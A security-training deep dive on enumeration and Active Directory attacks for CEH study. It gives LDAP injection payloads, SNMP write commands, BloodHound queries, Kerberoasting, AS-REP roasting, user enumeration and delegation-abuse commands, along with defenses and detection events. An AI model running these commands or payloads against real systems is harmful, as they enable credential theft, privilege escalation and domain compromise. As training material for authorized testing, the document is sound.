> For authorized security testing, red team exercises, and educational study only.

# Enumeration Techniques — Deep Dive (CEH v13 Module 04)

> This document supplements the enumeration cheat sheet with in-depth coverage of LDAP injection, SNMP MIB structures, Active Directory attack paths, Kerberos enumeration, and automated frameworks. Each section builds on the protocol-level commands from the sheet.

## Prerequisites

- Familiarity with TCP/IP and common service ports (see the enumeration cheat sheet)
- A lab environment: Active Directory domain controller, Linux targets with SNMP/NFS/LDAP
- Tools installed: Impacket suite, BloodHound + Neo4j, ldapsearch, snmpwalk, AutoRecon
- Authorized scope and rules of engagement documented before testing

---

## 1. LDAP Injection Techniques

LDAP injection exploits unsanitized user input in LDAP queries, similar in principle to SQL injection. When web applications construct LDAP filters from user-supplied data, attackers can modify query logic.

### 1.1 LDAP Filter Syntax

LDAP filters follow RFC 4515. The basic structure:

```
(attribute=value)               # equality
(&(condition1)(condition2))     # AND
(|(condition1)(condition2))     # OR
(!(condition))                  # NOT
(attribute=val*)                # substring/wildcard
```

### 1.2 Authentication Bypass

A vulnerable login form might build a filter like:

```
(&(uid=USER_INPUT)(userPassword=PASS_INPUT))
```

Injecting `*)(uid=*))(|(uid=*` as the username produces:

```
(&(uid=*)(uid=*))(|(uid=*)(userPassword=anything))
```

This matches all users and bypasses authentication.

### 1.3 Data Exfiltration via Blind LDAP Injection

When the application does not return LDAP data directly, use boolean-based blind injection:

```
# Test if admin user exists
username: admin)(|(cn=*
# Application behaves differently if the user exists

# Extract attribute values character by character
username: *)(uid=admin)(department=I*
username: *)(uid=admin)(department=IT*
username: *)(uid=admin)(department=IT-*
```

Each request narrows the value by observing application responses (login success, error message differences, response timing).

### 1.4 Common Injection Points

| Vector                   | Vulnerable Filter Pattern                        |
|--------------------------|--------------------------------------------------|
| Login forms              | `(&(uid=%s)(userPassword=%s))`                   |
| Search/directory lookups | `(cn=*%s*)`                                      |
| Password reset flows     | `(&(mail=%s)(objectClass=person))`               |
| Group membership checks  | `(&(memberOf=CN=%s,DC=corp,DC=local))`           |

### 1.5 Defenses

- Use parameterized LDAP queries (bind variables) where the framework supports them
- Sanitize input: escape `*`, `(`, `)`, `\`, NUL per RFC 4515 Section 3
- Apply least privilege to the LDAP service account — read-only, restricted base DN
- Monitor for anomalous LDAP query patterns in logs

---

## 2. SNMP MIB Tree Structure and Valuable OIDs

The Management Information Base (MIB) is a hierarchical namespace where each node is identified by an Object Identifier (OID). Understanding the tree structure lets you target the most valuable data.

### 2.1 MIB-II Tree Overview

```
iso(1)
 └── org(3)
      └── dod(6)
           └── internet(1)
                ├── mgmt(2)
                │    └── mib-2(1)
                │         ├── system(1)        — hostname, description, uptime, contact
                │         ├── interfaces(2)    — NICs, IPs, traffic stats
                │         ├── at(3)            — ARP table
                │         ├── ip(4)            — routing table, IP addresses
                │         ├── icmp(5)          — ICMP stats
                │         ├── tcp(6)           — TCP connection table
                │         ├── udp(7)           — UDP listener table
                │         └── host(25)         — processes, software, storage
                └── private(4)
                     └── enterprises(1)       — vendor-specific MIBs
```

### 2.2 High-Value OIDs for Penetration Testing

```bash
# System info
snmpwalk -v2c -c public <target> 1.3.6.1.2.1.1.1.0    # sysDescr (OS, version)
snmpwalk -v2c -c public <target> 1.3.6.1.2.1.1.5.0    # sysName (hostname)

# Network interfaces and IPs
snmpwalk -v2c -c public <target> 1.3.6.1.2.1.2.2.1.2  # ifDescr (interface names)
snmpwalk -v2c -c public <target> 1.3.6.1.2.1.4.20.1.1 # ipAdEntAddr (all IPs)

# ARP cache — discover neighbors
snmpwalk -v2c -c public <target> 1.3.6.1.2.1.3.1.1.2

# TCP connections — find listening services
snmpwalk -v2c -c public <target> 1.3.6.1.2.1.6.13.1.3 # tcpConnLocalPort

# Running processes (Windows and Linux)
snmpwalk -v2c -c public <target> 1.3.6.1.2.1.25.4.2.1.2  # hrSWRunName

# Installed software
snmpwalk -v2c -c public <target> 1.3.6.1.2.1.25.6.3.1.2  # hrSWInstalledName

# Windows user accounts (vendor-specific)
snmpwalk -v2c -c public <target> 1.3.6.1.4.1.77.1.2.25   # LanManager MIB

# Storage/disk info
snmpwalk -v2c -c public <target> 1.3.6.1.2.1.25.2.3.1    # hrStorage
```

### 2.3 SNMPv3 Security Levels

| Level      | Auth | Encryption | Use Case                    |
|------------|------|------------|-----------------------------|
| noAuthNoPriv | No  | No         | Same as v1/v2c — insecure   |
| authNoPriv   | Yes | No         | Integrity but cleartext data|
| authPriv     | Yes | Yes        | Full protection — target standard |

SNMPv3 with `authPriv` uses SHA/SHA-256 for authentication and AES-128/256 for encryption. During enumeration, attempt downgrade to v2c if v3 credentials are unknown — many devices still accept both.

### 2.4 Extracting Write-Community Strings

If a write community string is discovered (often `private`), an attacker can modify device configuration:

```bash
# Change the system contact (proof of write access)
snmpset -v2c -c private <target> 1.3.6.1.2.1.1.4.0 s "pwned"

# On Cisco devices — download running config via TFTP
snmpset -v2c -c private <target> 1.3.6.1.4.1.9.9.96.1.1.1.1.2.<random> i 1
# (Full Cisco config copy requires several SET operations)
```

---

## 3. Active Directory Attack Paths (BloodHound Graph Theory)

BloodHound models Active Directory as a directed graph where nodes represent principals (users, groups, computers) and edges represent relationships (membership, ACLs, sessions). Finding a path from a compromised node to a high-value target (Domain Admin) is a graph traversal problem.

### 3.1 Key Relationship Types (Edges)

| Edge Label          | Meaning                                           |
|---------------------|---------------------------------------------------|
| MemberOf            | User/group is a member of another group           |
| AdminTo             | Principal has local admin rights on a computer    |
| HasSession          | User has an active session on a computer          |
| CanRDP              | Principal can RDP to the computer                 |
| GenericAll          | Full control over the target object               |
| GenericWrite        | Can modify attributes of the target object        |
| WriteDacl           | Can modify the DACL — grant yourself any right    |
| WriteOwner          | Can take ownership — then modify the DACL         |
| ForceChangePassword | Can reset the target user's password              |
| AddMember           | Can add members to the target group               |
| DCSync              | Replication rights — can dump all password hashes |
| AllowedToDelegate   | Kerberos delegation — impersonate any user        |
| GPLink              | GPO linked to OU — potential for mass compromise  |

### 3.2 Collection and Ingestion

```bash
# Python collector (from Linux)
bloodhound-python -d corp.local -u jsmith -p 'Password1' \
  -c All -ns 10.10.10.1 --zip

# SharpHound (from Windows)
.\SharpHound.exe -c All --zipfilename output.zip

# Start Neo4j and BloodHound
sudo neo4j console &
bloodhound
# Import the zip file via the GUI
```

### 3.3 Common Attack Path Queries (Cypher)

```cypher
-- Shortest path from owned user to Domain Admins
MATCH p=shortestPath((u:User {owned:true})-[*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"}))
RETURN p

-- Find Kerberoastable users with paths to DA
MATCH (u:User {hasspn:true}), (g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"}),
p=shortestPath((u)-[*1..]->(g))
RETURN u.name, LENGTH(p) ORDER BY LENGTH(p)

-- Users with DCSync rights
MATCH (u)-[:DCSync|GetChanges|GetChangesAll*1..]->(d:Domain)
RETURN u.name, d.name

-- Computers where Domain Admins have sessions
MATCH (u:User)-[:MemberOf*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"}),
(c:Computer)-[:HasSession]->(u)
RETURN c.name, u.name
```

### 3.4 Typical Attack Chain

1. **Initial foothold** — phishing, web exploit, or credential stuffing
2. **Local enumeration** — `whoami /all`, check local admin, find cached credentials
3. **BloodHound collection** — run SharpHound/bloodhound-python
4. **Path analysis** — find shortest path to Domain Admin
5. **Lateral movement** — follow the path: exploit AdminTo, HasSession, or ACL edges
6. **Privilege escalation** — abuse GenericAll/WriteDacl/DCSync to reach DA
7. **Persistence** — Golden Ticket, Skeleton Key, or new DA account

### 3.5 Defensive Detection

- Monitor Event ID 4662 (DS-Replication-Get-Changes) for DCSync attempts
- Alert on abnormal LDAP queries matching BloodHound collection patterns
- Use AD Tiering (Tier 0/1/2) to limit lateral movement edges
- Regularly run BloodHound defensively to identify and prune dangerous paths

---

## 4. Kerberos Enumeration

Kerberos is the default authentication protocol in Active Directory. Several enumeration and attack techniques target its ticket-based architecture.

### 4.1 Kerberos Authentication Flow

```
Client              KDC (Domain Controller)         Service
  |                        |                           |
  |--- AS-REQ ------------>|                           |
  |<-- AS-REP (TGT) ------|                           |
  |                        |                           |
  |--- TGS-REQ (TGT) ---->|                           |
  |<-- TGS-REP (ST) ------|                           |
  |                        |                           |
  |--- AP-REQ (ST) ------->----------------------------->
  |<-- AP-REP -------------|<----------------------------
```

### 4.2 SPN Scanning (Kerberoasting)

Service Principal Names (SPNs) map services to accounts. When an SPN is registered to a user account (not a machine account), the TGS ticket is encrypted with the user's password hash — crackable offline.

```bash
# Find accounts with SPNs (Impacket)
GetUserSPNs.py corp.local/jsmith:'Password1' -dc-ip 10.10.10.1

# Request TGS tickets for cracking
GetUserSPNs.py corp.local/jsmith:'Password1' -dc-ip 10.10.10.1 -request \
  -outputfile kerberoast_hashes.txt

# Crack with hashcat (mode 13100 for krb5tgs)
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt

# PowerShell (from domain-joined host)
# Invoke-Kerberoast (PowerView/Rubeus)
Rubeus.exe kerberoast /outfile:hashes.txt
```

### 4.3 AS-REP Roasting

Accounts with "Do not require Kerberos preauthentication" enabled respond to AS-REQ without proof of identity. The AS-REP contains data encrypted with the user's hash.

```bash
# Find AS-REP roastable accounts
GetNPUsers.py corp.local/ -usersfile users.txt -dc-ip 10.10.10.1 -format hashcat

# With credentials — enumerate automatically
GetNPUsers.py corp.local/jsmith:'Password1' -dc-ip 10.10.10.1 -format hashcat

# Crack with hashcat (mode 18200 for krb5asrep)
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

### 4.4 Kerberos User Enumeration (Pre-Auth Timing)

Without credentials, valid usernames can be enumerated by observing KDC responses to AS-REQ:

```bash
# kerbrute — fast Kerberos user enumeration
kerbrute userenum --dc 10.10.10.1 -d corp.local /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

# Nmap Kerberos script
nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='corp.local',userdb=users.txt <dc-ip>
```

Response codes reveal validity:
- `KDC_ERR_PREAUTH_REQUIRED` — user exists, preauth needed (valid account)
- `KDC_ERR_CLIENT_REVOKED` — account disabled/locked (valid but unusable)
- `KDC_ERR_C_PRINCIPAL_UNKNOWN` — user does not exist

### 4.5 Delegation Abuse

```bash
# Find unconstrained delegation computers
Get-DomainComputer -Unconstrained | Select-Object dnshostname

# Find constrained delegation accounts
Get-DomainUser -TrustedToAuth | Select-Object samaccountname,msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | Select-Object dnshostname,msds-allowedtodelegateto

# Abuse constrained delegation (Impacket)
getST.py -spn cifs/target.corp.local -impersonate administrator \
  corp.local/svc_account:'Password1' -dc-ip 10.10.10.1
export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass corp.local/administrator@target.corp.local
```

### 4.6 Kerberos Countermeasures

- Set strong passwords (25+ characters) for all service accounts with SPNs
- Use Group Managed Service Accounts (gMSA) — automatic 120-char password rotation
- Require Kerberos preauthentication on all accounts
- Monitor Event IDs 4768 (TGT request) and 4769 (TGS request) for anomalies
- Limit delegation; prefer resource-based constrained delegation (RBCD)

---

## 5. Automated Enumeration Frameworks

Manual enumeration is thorough but time-consuming. These frameworks orchestrate multiple tools and produce structured output.

### 5.1 AutoRecon

AutoRecon runs staged Nmap scans and launches protocol-specific enumeration tools automatically for each discovered service.

```bash
# Install
pip3 install autorecon

# Basic scan — single target
autorecon 10.10.10.1

# Multiple targets with custom output directory
autorecon 10.10.10.1 10.10.10.2 -o /path/to/output

# Scan specific ports only
autorecon 10.10.10.1 --only-scans-dir
```

Output structure:
```
results/
  10.10.10.1/
    report/
      notes.txt              # summary
    scans/
      _quick_tcp_nmap.txt    # initial port scan
      _full_tcp_nmap.txt     # full port scan
      tcp_445_smb_enum4linux.txt
      tcp_80_http_nikto.txt
      udp_161_snmp_snmpwalk.txt
    exploit/                 # suggested exploits
    loot/                    # extracted data
```

AutoRecon selects tools by detected service:
- Port 445 triggers enum4linux, smbclient, smbmap
- Port 161 triggers snmpwalk, snmp-check
- Port 389 triggers ldapsearch
- Port 80/443 triggers nikto, gobuster, whatweb

### 5.2 Legion (formerly Sparta)

Legion provides a GUI-driven workflow with the same automatic tool chaining:

```bash
# Install (Kali)
sudo apt install legion

# Launch
sudo legion
```

Features:
- Automatic service detection and tool selection
- Built-in credential brute-forcing (Hydra integration)
- Screenshot capture for web services
- CVE lookup for detected service versions
- Centralized results database

### 5.3 Reconmap / Nmap Scripting Engine (NSE)

For a lighter approach, Nmap's scripting engine covers many enumeration tasks:

```bash
# Run all default enumeration scripts for discovered services
nmap -sV -sC <target>

# Run a category of scripts
nmap --script discovery <target>
nmap --script "smb-enum-*" <target>
nmap --script "ldap-*" <target>

# Combine specific scripts
nmap --script "snmp-brute,snmp-info,snmp-sysdescr" -sU -p 161 <target>
```

### 5.4 Choosing the Right Framework

| Scenario                          | Recommended Tool     |
|-----------------------------------|----------------------|
| CTF / single-target deep dive     | AutoRecon            |
| Network-wide pentest (many hosts) | Legion / CrackMapExec|
| Quick service enumeration         | Nmap NSE             |
| AD-focused engagement             | BloodHound + PowerView|
| Bug bounty (external recon)       | Amass + subfinder + httpx|

### 5.5 Caveats

- Automated tools generate significant network traffic — noisy in monitored environments
- Always review raw output; tools miss context that manual analysis catches
- Some tools may crash target services (especially old SMB/SNMP daemons)
- Ensure scope compliance — automated tools can accidentally scan out-of-scope hosts
- Correlate findings across tools: one tool's output is another tool's input
